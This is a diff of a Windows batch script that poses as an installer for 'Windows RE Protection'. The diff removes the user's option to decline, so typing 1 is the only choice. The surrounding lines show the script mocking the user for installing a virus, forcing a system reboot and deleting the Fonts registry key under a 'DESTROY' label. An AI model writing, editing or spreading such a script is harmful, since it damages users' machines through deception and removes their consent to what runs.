@@ -118,12 +118,10 @@ echo :)
 echo .....................................................
 echo,
 echo,
-echo 1 - Install
-echo 2 - No.
+echo 1 - :)
 echo,
-SET /P M=Type 1 or 2 then press ENTER:
+SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN81INSTALLRE
-IF %M%==2 GOTO EXIT
 :WIN81INSTALLRE
 cls
 echo Installing Windows RE Protection...
@@ -173,7 +171,7 @@ exit
 echo you idiot, you installed a virus, now suffer!!!!!!!!!
 echo,
 wmic os where primary=1 reboot
-:DESTOY
+:DESTROY
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
 GOTO AAAAJJ
 :MAININSTALLB
